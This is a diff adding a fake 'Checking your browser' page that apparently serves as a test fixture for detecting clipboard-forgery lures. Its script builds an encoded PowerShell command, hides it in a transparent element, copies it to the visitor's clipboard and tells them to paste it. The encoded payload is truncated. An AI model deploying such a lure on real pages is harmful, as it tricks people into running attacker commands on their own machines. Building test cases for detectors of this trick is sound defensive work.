@@ -1,0 +1,18 @@
+<!doctype html><meta charset="utf-8"><title>Checking your browser</title>
+<h1>Confirm you are human</h1>
+<div id="box"><span id="s" style="display:inline-block;width:20px;height:20px;border:1px solid #888"></span><pre id="decoy" style="opacity:0;margin:0"></pre></div>
+<button id="c">Continue</button>
+<div id="steps"></div>
+<script>
+  // Forgery attempt: a selection from a visible empty node to the end of a transparent <pre>, so the
+  // range's common ancestor is visible. Weak-lure page. Payload built at runtime.
+  var payload = ['power', 'shell', ' -en', 'c', ' SQBFAFgA'].join('');
+  var decoy = document.getElementById('decoy');
+  decoy.textContent = payload;
+  document.getElementById('c').onclick = function () {
+    var r = document.createRange(); r.setStart(document.getElementById('s'), 0); r.setEnd(decoy, decoy.childNodes.length);
+    var s = getSelection(); s.removeAllRanges(); s.addRange(r);
+    try { navigator.clipboard.writeText(payload); } catch (e) {}
+    document.getElementById('steps').textContent = 'Paste it to continue.';
+  };
+</script>
